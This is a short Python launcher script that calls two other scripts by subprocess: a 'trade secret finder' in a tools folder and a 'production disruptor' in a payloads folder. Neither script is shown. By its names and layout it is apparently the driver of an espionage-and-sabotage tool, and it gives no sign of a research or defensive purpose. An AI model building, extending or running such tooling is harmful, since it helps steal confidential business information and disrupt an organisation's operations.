import subprocess
import os

def main():
    # Run the trade secret finder
    finder_path = os.path.join(os.path.dirname(__file__), "tools", "trade_secret_finder.py")
    subprocess.run(["python3", finder_path])

    # Run the production disruptor
    disruptor_path = os.path.join(os.path.dirname(__file__), "payloads", "production_disruptor.py")
    subprocess.run(["python3", disruptor_path])

if __name__ == "__main__":
    main()
